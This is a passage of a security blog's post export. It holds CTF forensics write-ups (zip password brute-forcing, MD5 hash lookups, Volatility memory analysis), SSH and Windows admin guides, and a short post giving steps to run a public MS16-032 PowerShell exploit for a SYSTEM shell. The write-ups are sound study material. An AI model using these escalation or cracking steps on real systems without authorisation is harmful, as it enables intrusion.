ISO-8859-5ISO8859-5 ok: ISO8859-5ISO_8859-5:1988 ok: ISO_8859-5:1988ISO88599 ok: ISO88599ISO_8859-9 ok: ISO_8859-9ISO-8859-9 ok: ISO-8859-9ISO8859-9 ok: ISO8859-9ISO_8859-9:1989 ok: ISO_8859-9:1989ISO88599E ok: ISO88599EISO_8859-9E ok: ISO_8859-9EISO-8859-9E ok: ISO-8859-9EISO8859-9E ok: ISO8859-9EISO-CELTIC ok: ISO-CELTICISO-IR-100 ok: ISO-IR-100ISO-IR-101 ok: ISO-IR-101ISO-IR-110 ok: ISO-IR-110ISO-IR-111 ok: ISO-IR-111ISO-IR-139 ok: ISO-IR-139ISO-IR-143 ok: ISO-IR-143ISO-IR-144 ok: ISO-IR-144ISO-IR-148 ok: ISO-IR-148ISO-IR-156 ok: ISO-IR-156ISO-IR-157 ok: ISO-IR-157ISO-IR-179 ok: ISO-IR-179ISO-IR-199 ok: ISO-IR-199ISO-IR-203 ok: ISO-IR-203ISO-IR-226 ok: ISO-IR-226ISO/TR_11548-1/ ok: ISO/TR_11548-1/KOI8R ok: KOI8RKOI8-R ok: KOI8-RKOI8-RU ok: KOI8-RUKOI8U ok: KOI8UKOI8-U ok: KOI8-UL1 ok: L1L10 ok: L10L2 ok: L2L4 ok: L4L5 ok: L5L6 ok: L6L7 ok: L7L8 ok: L8LATIN1 ok: LATIN1LATIN10 ok: LATIN10LATIN2 ok: LATIN2LATIN4 ok: LATIN4LATIN5 ok: LATIN5LATIN6 ok: LATIN6LATIN7 ok: LATIN7LATIN8 ok: LATIN8LATIN9 ok: LATIN9LATIN-9 ok: LATIN-9MAC ok: MACMAC-CENTRALEUROPE ok: MAC-CENTRALEUROPEMACCYRILLIC ok: MACCYRILLICMAC-CYRILLIC ok: MAC-CYRILLICMACINTOSH ok: MACINTOSHMACIS ok: MACISMAC-IS ok: MAC-ISMAC-SAMI ok: MAC-SAMIMACUK ok: MACUKMAC-UK ok: MAC-UKMACUKRAINIAN ok: MACUKRAINIANMIK ok: MIKMS-ARAB ok: MS-ARABMS-CYRL ok: MS-CYRLMSMACCYRILLIC ok: MSMACCYRILLICMS-MAC-CYRILLIC ok: MS-MAC-CYRILLICOSF00010001 ok: OSF00010001OSF00010002 ok: OSF00010002OSF00010004 ok: OSF00010004OSF00010005 ok: OSF00010005OSF00010009 ok: OSF00010009OSF0001000A ok: OSF0001000AOSF00010100 ok: OSF00010100OSF00010101 ok: OSF00010101OSF00010102 ok: OSF00010102OSF10020025 ok: OSF10020025OSF10020111 ok: OSF10020111OSF10020115 ok: OSF10020115OSF10020116 ok: OSF10020116OSF10020118 ok: OSF10020118OSF1002011C ok: OSF1002011COSF1002011D ok: OSF1002011DOSF10020129 ok: OSF10020129OSF100201B5 ok: OSF100201B5OSF100201F4 ok: OSF100201F4OSF10020352 ok: OSF10020352OSF10020354 ok: OSF10020354OSF10020357 ok: OSF10020357OSF1002035D ok: OSF1002035DOSF1002035E ok: OSF1002035EOSF1002035F ok: OSF1002035FOSF10020366 ok: OSF10020366OSF10020367 ok: OSF10020367OSF10020370 ok: OSF10020370OSF10020402 ok: OSF10020402OSF10020417 ok: OSF10020417PT154 ok: PT154RK1048 ok: RK1048RUSCII ok: RUSCIISTRK1048-2002 ok: STRK1048-2002TCVN ok: TCVNTCVN-5712 ok: TCVN-5712TCVN5712-1 ok: TCVN5712-1TCVN5712-1:1993 ok: TCVN5712-1:1993TS-5881 ok: TS-5881UCS2 ok: UCS2UCS-2 ok: UCS-2UCS-2BE ok: UCS-2BEUCS-2LE ok: UCS-2LEUNICODE ok: UNICODEUNICODEBIG ok: UNICODEBIGUNICODELITTLE ok: UNICODELITTLEUTF16 ok: UTF16UTF-16 ok: UTF-16UTF16BE ok: UTF16BEUTF-16BE ok: UTF-16BEUTF16LE ok: UTF16LEUTF-16LE ok: UTF-16LEVISCII ok: VISCIIWINDOWS-1251 ok: WINDOWS-1251WINDOWS-1256 ok: WINDOWS-1256 Tried UTF-16, UNICODELITTLE, UNICODE, LATIN1, ISO-8859-1 WINDOWS-1251, CP1251 with iconv. Tried enca recognition: 123456[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ enca -f keylog.log_file.None.0x80eb7008.datenca: Cannot determine (or understand) your language preferences.Please use `-L language&apos;, or `-L none&apos; if your language is not supported(only a few multibyte encodings can be recognized then).Run `enca --list languages&apos; to get a list of supported languages. Tried chardet (not even a relevent output): 123[noraj@rawsec]––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/For2]$ chardetect keylog.log_file.None.0x80eb7008.datkeylog.log_file.None.0x80eb7008.dat: windows-1253 with confidence 0.3253156807138245 Submit","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"WhiteHat GrandPrix - 100 - Banh Giay - Forensics","slug":"WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay","date":"2016-12-16T23:00:00.000Z","updated":"2017-02-07T18:23:36.722Z","comments":true,"path":"en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/","link":"","permalink":"https://rawsec.ml/en/WhiteHat-GrandPrix-2016-forensics-100-Banh-Giay/","excerpt":"","text":"Informations Version By Version Comment noraj 1.0 Creation CTF Name : WhiteHat GrandPrix 2016 Website : grandprix.whitehatvn.com Type : Online Format : Jeopardy CTF Time : link Description Submit: WhiteHat{SHA1(flag)} http://material.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip http://bakmaterial.grandprix.whitehatvn.com/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip Alternative server on amazon in case of low traffic: http://54.183.97.137/gp2016/For01_7afbfe8847d67c8dd51d7227091bb9aaaafe11f3.zip Solution Download the zip. Extract it. Open the pcapng with Wireshark. Filter http requests. See frame n°134 GET /corporation/secret HTTP/1.1. Extract the file (File &gt; Export Objects &gt; HTTP). Check the type of file: 123[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ file secretsecret: Zip archive data, at least v2.0 to extract Unzip it: 1234[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ unzip secretArchive: secret[secret] EasyExtrack password: Ok, there is a pasword, let's check the html page: frame n°149 GET /corporation/arsenal.html HTTP/1.1. Extract it from the pcapng. See the hint: For H.i.n.t: Referring to arsenal, i remember a number. It also length of secret p.a.s.s.w.o.r.d. One key event is: 30 October: Arsenal recorded victory in the League Cup to a record-breaking 7–5 scoreline at the Madjeski Stadium, having been 4–0 down initially. The game had the most goals ever scored in a single League Cup match (12). With luck and guessing I found this number was 4. So now let's try to crack the zip password with fcrackzip: 1234[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ fcrackzip -b -c a -l 4 -u secretPASSWORD FOUND!!!!: pw == fuzu Extract the zip with the password. Check what file type EasyExtrack is: 123[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ file EasyExtrackEasyExtrack: Zip archive data, at least v1.0 to extract Try to unzip it with the same password: 1234567891011121314151617181920212223242526272829303132333435[noraj@rawsec]–––––––––––––––––––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016]$ unzip EasyExtrack -d outArchive: EasyExtrack creating: out/EasyExtrack/[EasyExtrack] EasyExtrack/flag1.txt password: inflating: out/EasyExtrack/flag1.txt inflating: out/EasyExtrack/flag10.txt inflating: out/EasyExtrack/flag11.txt inflating: out/EasyExtrack/flag12.txt inflating: out/EasyExtrack/flag13.txt inflating: out/EasyExtrack/flag14.txt inflating: out/EasyExtrack/flag15.txt inflating: out/EasyExtrack/flag16.txt inflating: out/EasyExtrack/flag17.txt inflating: out/EasyExtrack/flag18.txt inflating: out/EasyExtrack/flag19.txt inflating: out/EasyExtrack/flag2.txt inflating: out/EasyExtrack/flag20.txt inflating: out/EasyExtrack/flag21.txt inflating: out/EasyExtrack/flag22.txt inflating: out/EasyExtrack/flag23.txt inflating: out/EasyExtrack/flag24.txt inflating: out/EasyExtrack/flag25.txt inflating: out/EasyExtrack/flag26.txt inflating: out/EasyExtrack/flag27.txt inflating: out/EasyExtrack/flag28.txt inflating: out/EasyExtrack/flag29.txt inflating: out/EasyExtrack/flag3.txt inflating: out/EasyExtrack/flag30.txt inflating: out/EasyExtrack/flag4.txt inflating: out/EasyExtrack/flag5.txt inflating: out/EasyExtrack/flag6.txt inflating: out/EasyExtrack/flag7.txt inflating: out/EasyExtrack/flag8.txt inflating: out/EasyExtrack/flag9.txt Here are all the flags: 123456789101112131415161718192021222324252627282930raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;12f54a96f6444324693t0da001cafda8b&#125;raw: Flag&#123;60b725f10c9c85c70d9h7880dfe8191b3&#125;raw: Flag&#123;f5302386464f953ed58u1edac03556e55&#125;raw: Flag&#123;d9bed3b7e151f11b8fdyadf75f1db96d9&#125;raw: Flag&#123;3b5d5c3712955042212n316173ccf37be&#125;raw: Flag&#123;72cfd272ace172fa3502h6445fbef9b03&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;9a8ad92c50cae39aa2c5604pfd0ab6d8c&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;d2a33790e5bf28b33cdxbf61722a06989&#125;raw: Flag&#123;12f54a96f64443s246930da001cafda8b&#125;raw: Flag&#123;92520a5a9cf8932i20b9cd447f585f144&#125;raw: Flag&#123;01fbdc44ef819db6p273bc30965a23814&#125;raw: Flag&#123;9ffbf43126e33be52hcd2bf7e01d627f9&#125;raw: Flag&#123;12f54a96f644432469o30da001cafda8b&#125;raw: Flag&#123;9d7bf075372908f55e2nd945c39e0a613&#125;raw: Flag&#123;92520a5a9cf893220b9cud447f585f144&#125;raw: Flag&#123;009520053b00386d1173fu3988c55d192&#125;raw: Flag&#123;e73af36376314c7c0022cbk1d204f76b3&#125;raw: Flag&#123;e85dde330c34efb0e526ee3j082e4353b&#125;raw: Flag&#123;7d9d25f71cb8a5aba8620254l0a20d405&#125; Flags are not hashes because they are 33 char long. But we can see there is one non-hex char in each flag. Remove each non-hex flag to get 32 char long MD5 hashed: 123456789101112131415161718192021222324252627282930d2a33790e5bf28b33cdbf61722a0698912f54a96f64443246930da001cafda8b60b725f10c9c85c70d97880dfe8191b3f5302386464f953ed581edac03556e55d9bed3b7e151f11b8fdadf75f1db96d93b5d5c3712955042212316173ccf37be72cfd272ace172fa35026445fbef9b03d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a069899a8ad92c50cae39aa2c5604fd0ab6d8cd2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a06989d2a33790e5bf28b33cdbf61722a0698912f54a96f64443246930da001cafda8b92520a5a9cf893220b9cd447f585f14401fbdc44ef819db6273bc30965a238149ffbf43126e33be52cd2bf7e01d627f912f54a96f64443246930da001cafda8b9d7bf075372908f55e2d945c39e0a61392520a5a9cf893220b9cd447f585f144009520053b00386d1173f3988c55d192e73af36376314c7c0022cb1d204f76b3e85dde330c34efb0e526ee3082e4353b7d9d25f71cb8a5aba86202540a20d405 The extracted wrong letters are (in order): xthuynhxxxpxxxxxxxxsiphonuukjl. Use hashkiller.co.uk to decrypt MD5 hashes: 123456789101112131415161718192021222324252627282930d2a33790e5bf28b33cdbf61722a06989 MD5 : F12f54a96f64443246930da001cafda8b MD5 : l60b725f10c9c85c70d97880dfe8191b3 MD5 : af5302386464f953ed581edac03556e55 MD5 : gd9bed3b7e151f11b8fdadf75f1db96d9 MD5 : &#123;3b5d5c3712955042212316173ccf37be MD5 : b72cfd272ace172fa35026445fbef9b03 MD5 : rd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : F9a8ad92c50cae39aa2c5604fd0ab6d8c MD5 : fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : Fd2a33790e5bf28b33cdbf61722a06989 MD5 : F12f54a96f64443246930da001cafda8b MD5 : l92520a5a9cf893220b9cd447f585f144 MD5 : _01fbdc44ef819db6273bc30965a23814 MD5 : h9ffbf43126e33be52cd2bf7e01d627f9 MD5 : e12f54a96f64443246930da001cafda8b MD5 : l9d7bf075372908f55e2d945c39e0a613 MD5 : p92520a5a9cf893220b9cd447f585f144 MD5 : _009520053b00386d1173f3988c55d192 MD5 : ye73af36376314c7c0022cb1d204f76b3 MD5 : oe85dde330c34efb0e526ee3082e4353b MD5 : u7d9d25f71cb8a5aba86202540a20d405 MD5 : &#125; Unformated flag is: Flag{brFFFfFFFFFFFFl_help_you}. SHA1 the unformated flag: 123[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]$ printf %s &apos;Flag&#123;brFFFfFFFFFFFFl_help_you&#125;&apos; | sha1sume7643ccd180c84176ae0b4361c3b169fceacf961 - Format the flag: WhiteHat{e7643ccd180c84176ae0b4361c3b169fceacf961}. Not the good flag ... Note that 800618943025315f869e4e1f09471012 is the right md5 hash for F and d2a33790e5bf28b33cdbf61722a06989 is the wrong md5 hash for F that you can obtain with non POSIX tools like echo (that's why I use printf). So only hashkiller knows both wrong and right hash, all other md5 decrypt online tools knows only the right one so they are not able to decrypt d2a33790e5bf28b33cdbf61722a06989. But anyway... You know what? After some wasted hours I figured that I needed to replace F with some guessed letters: Flag{bruteforce_will_help_you}. Yes guessing again. SHA1 the unformated flag: 123[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]$ printf %s &apos;Flag&#123;bruteforce_will_help_you&#125;&apos; | sha1sum1e71b26aa01733cd13e5199386c70fe31df43deb - Format the flag: WhiteHat{1e71b26aa01733cd13e5199386c70fe31df43deb}. Not the good flag ... Description said Submit: WhiteHat{SHA1(flag)}, it depends if flag means Flag{xxx} or xxx. SHA1 the unformated flag: 123[noraj@rawsec]–––––––––––––––––––[~/CTF/WhiteHat_GrandPrix/2016/out/EasyExtrack]$ printf %s &apos;bruteforce_will_help_you&apos; | sha1sum 31bd8aa56447ea1c703d0943e175a06a5c4ee614 - Format the flag: WhiteHat{31bd8aa56447ea1c703d0943e175a06a5c4ee614}. This time this is the good one. Here was my ruby script: 12345678910#!/usr/bin/ruby(1..30).each do |num| raw_flag = File.read('flag'+num.to_s+'.txt') # Not sanitized flags puts 'raw: '.concat(raw_flag) only_flag = raw_flag.match(/\\&#123;([a-z0-9]&#123;33&#125;)\\&#125;/).captures[0] # Sanitized flags puts only_flag.gsub(/[^0-9a-fA-F]/, '')end Note: CTF orga team should test challenges and remove the crappy ones before let teams have pain with them. Submit And we also get one of the 23 parts of the puzzle: This is for the Discovering Vietnam bonus challenge. It is a puzzle of 23 parts, you need them to get a QR-code that give a flag. Flag will give 10% bonus points of the current score. I think we need to do almost all challenges to get all the pieces.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"OpenSUSE : change ssh port / use a cutom ssh port","slug":"opensuse-change-ssh-port","date":"2016-12-13T23:00:00.000Z","updated":"2017-02-07T18:23:36.882Z","comments":true,"path":"en/opensuse-change-ssh-port/","link":"","permalink":"https://rawsec.ml/en/opensuse-change-ssh-port/","excerpt":"","text":"For this exemple, our custom ssh port will be 52222. Edit /etc/ssh/sshd_config: 1# vim /etc/ssh/sshd_config Uncomment Port 22 and change it to Port 52222. Note: You can add several times the Port directive to allow several ports. This can be usefull first to not be locked out of teh server. For example: 12Port 22Port 52222 Restart the ssh deamon: 1# systemctl restart sshd.service Do not close your current ssh session and test if you can localy connect via ssh with the new port: 1$ ssh user@localhost -p 52222 If it works you can exit the test ssh connection. Now we will need to allow this new port in the firewall. To do so, edit /etc/sysconfig/SuSEfirewall2.d/services/sshd: 1# vim /etc/sysconfig/SuSEfirewall2.d/services/sshd Change TCP=&quot;ssh&quot; to TCP=&quot;52222&quot; (this will only allow port 52222 for ssh) or to TCP=&quot;ssh 52222&quot; if you want both ports. Note: this is possible because there is FW_CONFIGURATIONS_EXT=&quot;sshd&quot; in your /etc/sysconfig/SuSEfirewall2 config file. Known terms (mapping between well known ports and services, ex: ssh=22) are in /etc/services, it's not advised to modify this file. Now restart the firewall: 123# systemctl restart SuSEfirewall2.serviceor# rcSuSEfirewall2 restart Question: Why did we tested local ssh connection before modifying the firewall rules? Because the change we made only affects external connections (i.e. from the internet) so local connection are not restricted by firewall port filtering. Now we can safely exit the remote ssh connection. Now to connect to the server we have to specify the ssh port: 1$ ssh user@example.org -p 52222 or add a custom entry in .ssh/config (single user) or /etc/ssh_config (all users): 1234Host host_alias Hostname example.org Port 52222 User user and simply connect with: 1$ ssh host_alias","categories":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/categories/linux/"},{"name":"opensuse","slug":"linux/opensuse","permalink":"https://rawsec.ml/categories/linux/opensuse/"}],"tags":[{"name":"linux","slug":"linux","permalink":"https://rawsec.ml/tags/linux/"},{"name":"system","slug":"system","permalink":"https://rawsec.ml/tags/system/"},{"name":"opensuse","slug":"opensuse","permalink":"https://rawsec.ml/tags/opensuse/"}]},{"title":"SECCON - 100 - Memory Analysis - Forensics","slug":"SECCON-2016-100-forensics-memory-analysis","date":"2016-12-09T23:00:00.000Z","updated":"2017-02-07T18:23:36.868Z","comments":true,"path":"en/SECCON-2016-100-forensics-memory-analysis/","link":"","permalink":"https://rawsec.ml/en/SECCON-2016-100-forensics-memory-analysis/","excerpt":"","text":"Informations Version By Version Comment Chill3d 1.0 Creation CTF Name : SECCON 2016 Online CTF Website : seccon.jp Type : Online Format : Jeopardy CTF Time : link Description Find the website that the fake svchost is accessing. You can get the flag if you access the website!! The challenge files are huge, please download it first. Hint1: http://www.volatilityfoundation.org/ Hint2: Check the hosts file password: fjliejflsjiejlsiejee33cnc Solution For this challenge, we get a zip file wih a raw memory dump inside named forensic_100.raw. First, let's determine which OS is this dump come from : 123456789101112131415➜ volatility -f forensic_100.raw imageinfoVolatility Foundation Volatility Framework 2.5INFO : volatility.debug : Determining profile based on KDBG search... Suggested Profile(s) : WinXPSP2x86, WinXPSP3x86 (Instantiated with WinXPSP2x86) AS Layer1 : IA32PagedMemoryPae (Kernel AS) AS Layer2 : FileAddressSpace (/media/sf_Challenges/CTF/SECCON/forensic_100.raw) PAE type : PAE DTB : 0x34c000L KDBG : 0x80545ce0L Number of Processors : 1 Image Type (Service Pack) : 3 KPCR for CPU 0 : 0xffdff000L KUSER_SHARED_DATA : 0xffdf0000L Image date and time : 2016-12-06 05:28:47 UTC+0000 Image local date and time : 2016-12-06 14:28:47 +0900 Check the hosts file as the second hint say : 12345678910111213141516171819202122232425262728➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 dumpfiles -Q 0x000000000217b748 --dump-dir=.Volatility Foundation Volatility Framework 2.5DataSectionObject 0x0217b748 None \\Device\\HarddiskVolume1\\WINDOWS\\system32\\drivers\\etc\\hosts➜ lsfile.None.0x819a3008.dat forensic_100.raw memoryanalysis.zip➜ cat file.None.0x819a3008.dat# Copyright (c) 1993-1999 Microsoft Corp.## This is a sample HOSTS file used by Microsoft TCP/IP for Windows.## This file contains the mappings of IP addresses to host names. Each# entry should be kept on an individual line. The IP address should# be placed in the first column followed by the corresponding host name.# The IP address and the host name should be separated by at least one# space.## Additionally, comments (such as these) may be inserted on individual# lines or following the machine name denoted by a &apos;#&apos; symbol.## For example:## 102.54.94.97 rhino.acme.com # source server# 38.25.63.10 x.acme.com # x client host127.0.0.1 localhost153.127.200.178 crattack.tistory.com # So the DNS entry crattack.tistory.com is pointing on the 153.127.200.178 IP adress. List processus to see what was running when the memory was captured : 1234567891011121314151617181920212223242526272829303132333435➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 pstreeVolatility Foundation Volatility Framework 2.5Name Pid PPid Thds Hnds Time-------------------------------------------------- ------ ------ ------ ------ ---- 0x8231f698:explorer.exe 1556 1520 15 466 2016-12-06 05:27:10 UTC+0000. 0x821f8438:vmtoolsd.exe 1856 1556 3 129 2016-12-06 05:27:11 UTC+0000. 0x819b4380:tcpview.exe 3308 1556 2 84 2016-12-06 05:28:42 UTC+0000. 0x82267900:rundll32.exe 1712 1556 2 144 2016-12-06 05:27:16 UTC+0000. 0x8216a5e8:DumpIt.exe 3740 1556 1 25 2016-12-06 05:28:46 UTC+0000. 0x82170da0:ctfmon.exe 1872 1556 1 87 2016-12-06 05:27:11 UTC+0000 0x823c8660:System 4 0 58 259 1970-01-01 00:00:00 UTC+0000. 0x81a18020:smss.exe 540 4 3 19 2016-12-06 05:27:04 UTC+0000.. 0x82173da0:winlogon.exe 628 540 24 541 2016-12-06 05:27:07 UTC+0000... 0x8216e670:services.exe 672 628 15 286 2016-12-06 05:27:07 UTC+0000.... 0x81f46238:alg.exe 2028 672 7 104 2016-12-06 05:27:16 UTC+0000.... 0x82312450:svchost.exe 1036 672 87 1514 2016-12-06 05:27:08 UTC+0000..... 0x81f2cb20:wuauclt.exe 3164 1036 5 107 2016-12-06 05:28:15 UTC+0000..... 0x82062b20:wuauclt.exe 488 1036 7 132 2016-12-06 05:27:13 UTC+0000..... 0x81e56228:wscntfy.exe 720 1036 1 37 2016-12-06 05:27:18 UTC+0000.... 0x82154880:vmacthlp.exe 836 672 1 25 2016-12-06 05:27:08 UTC+0000.... 0x82151ca8:svchost.exe 936 672 10 272 2016-12-06 05:27:08 UTC+0000.... 0x81e4b4b0:vmtoolsd.exe 312 672 9 265 2016-12-06 05:27:13 UTC+0000.... 0x81f92778:svchost.exe 1088 672 7 83 2016-12-06 05:27:08 UTC+0000.... 0x81f00558:VGAuthService.e 196 672 2 60 2016-12-06 05:27:13 UTC+0000.... 0x81e18da0:svchost.exe 848 672 20 216 2016-12-06 05:27:08 UTC+0000..... 0x81e89200:wmiprvse.exe 596 848 12 255 2016-12-06 05:27:13 UTC+0000.... 0x81e41928:svchost.exe 1320 672 12 183 2016-12-06 05:27:10 UTC+0000.... 0x81f0dbe0:spoolsv.exe 1644 672 15 133 2016-12-06 05:27:10 UTC+0000.... 0x81f65da0:svchost.exe 1776 672 2 23 2016-12-06 05:27:10 UTC+0000..... 0x8225bda0:IEXPLORE.EXE 380 1776 22 385 2016-12-06 05:27:19 UTC+0000...... 0x8229f7e8:IEXPLORE.EXE 1080 380 19 397 2016-12-06 05:27:21 UTC+0000.... 0x81e4f560:svchost.exe 1704 672 5 107 2016-12-06 05:27:10 UTC+0000... 0x81f8c9a0:lsass.exe 684 628 26 374 2016-12-06 05:27:07 UTC+0000.. 0x81ef6da0:csrss.exe 604 540 11 480 2016-12-06 05:27:07 UTC+0000 0x81e886f0:GoogleUpdate.ex 372 1984 7 138 2016-12-06 05:27:13 UTC+0000 We see a IEXPLORE.EXE. Why don't check its history ? 123456789➜ volatility -f forensic_100.raw --profile=WinXPSP2x86 iehistoryVolatility Foundation Volatility Framework 2.5**************************************************Process: 1080 IEXPLORE.EXECache type &quot;DEST&quot; at 0x201ca83Last modified: 2016-12-06 14:28:40 UTC+0000Last accessed: 2016-12-06 05:28:42 UTC+0000URL: SYSTEM@http://crattack.tistory.com/entry/Data-Science-import-pandas-as-pdTitle: Security &amp;amp; Reverse :: [Data Science] Pandas - \\), If we visit this URL without matching the IP adress in the host file, we are on a CTF site. There is no flag on this site... But, if we match the IP adress with the URL, we have a file to download, and this file hold the flag :-) Flag : SECCON{h3110_w3_h4ve_fun_w4rg4m3} Note: We could retrieve the IP adress with the connscan plugin, but it was impossible to determine that the crattack.tistory.com site was associated with this IP adress.","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"writeups","slug":"security/writeups","permalink":"https://rawsec.ml/categories/security/writeups/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"writeups","slug":"writeups","permalink":"https://rawsec.ml/tags/writeups/"},{"name":"ctf","slug":"ctf","permalink":"https://rawsec.ml/tags/ctf/"},{"name":"forensics","slug":"forensics","permalink":"https://rawsec.ml/tags/forensics/"}]},{"title":"Manage local users and groups on Windows Server 2012","slug":"manage-local-users-and-groups-on-windows-server-2012","date":"2016-12-04T23:00:00.000Z","updated":"2017-02-07T18:23:37.042Z","comments":true,"path":"en/manage-local-users-and-groups-on-windows-server-2012/","link":"","permalink":"https://rawsec.ml/en/manage-local-users-and-groups-on-windows-server-2012/","excerpt":"","text":"Open Server Manager. Click Tools. Select Computer Management. Expand Local Users and Groups. Select Users or Groups. Double click on a user or a group. Do your stuff. Note: This works only for servers that are not Domain Controller (in this case just open Active Directory Users and Computer).","categories":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/categories/windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"}]},{"title":"Enable Remote Desktop Protocol (RDP) on Windows Server 2012","slug":"enable-remote-desktop-windows-server-2012","date":"2016-12-04T23:00:00.000Z","updated":"2017-02-07T18:23:36.935Z","comments":true,"path":"en/enable-remote-desktop-windows-server-2012/","link":"","permalink":"https://rawsec.ml/en/enable-remote-desktop-windows-server-2012/","excerpt":"","text":"To launch the Remote Desktop, there are two methods: CLI or GUI. From both you will be able to allow or not remote connections and choose users that can connect via RDP. with Command Line Interface (CLI) Open cmd.exe. Type SystemPropertiesRemote. This command launches the System Properties window on the Remote tab. with Graphical User Interface (GUI) Open the Control Panel, various ways: Press Windows + X and click Control Panel or from the Smart Screen (Windows + C and click Start) click Control Panel or move mouse to thr right upper side of screen and click Settings and then Control Panel or Windows + R and type control or type control in cmd.exe or via Explorer.exe (Windows + E) type Control Panel in teh adress bar etc... (easier with CLI right?). Click Advance System Settings, this launches the System Properties. Select the Remote tab.","categories":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/categories/windows/"}],"tags":[{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"}]},{"title":"Privilege Escalation (EoP) on Windows Server 2012 via PowerShell (PS)","slug":"privilege-escalation-on-windows-server-2012-via-powershell","date":"2016-12-04T23:00:00.000Z","updated":"2017-02-07T18:23:37.298Z","comments":true,"path":"en/privilege-escalation-on-windows-server-2012-via-powershell/","link":"","permalink":"https://rawsec.ml/en/privilege-escalation-on-windows-server-2012-via-powershell/","excerpt":"","text":"Download this powershell script and save it 39719.ps1. Open an unprivileged powershell terminal. Go to the folder location where you saved the script. Source the script: . .\\39719.ps1. Then type Invoke-MS16-032. Let the magic happens, you just got a nt authority\\system cmd.exe. I tested it on Windows Server 2012 R2 Datacenter Edition 64 bits but author tested it on others Windows. You can read more about: the exploit on Exploit Database, MS16-032 on Google Project Zero. Script infos: Author: Ruben Boonen (@FuzzySec) Blog: http://www.fuzzysecurity.com/ License: BSD 3-Clause Required Dependencies: PowerShell v2+ Optional Dependencies: None","categories":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/categories/security/"},{"name":"windows","slug":"security/windows","permalink":"https://rawsec.ml/categories/security/windows/"}],"tags":[{"name":"security","slug":"security","permalink":"https://rawsec.ml/tags/security/"},{"name":"windows","slug":"windows","permalink":"https://rawsec.ml/tags/windows/"}]},{"title":"Juniors CTF - 500 - Skeleton in the closet - 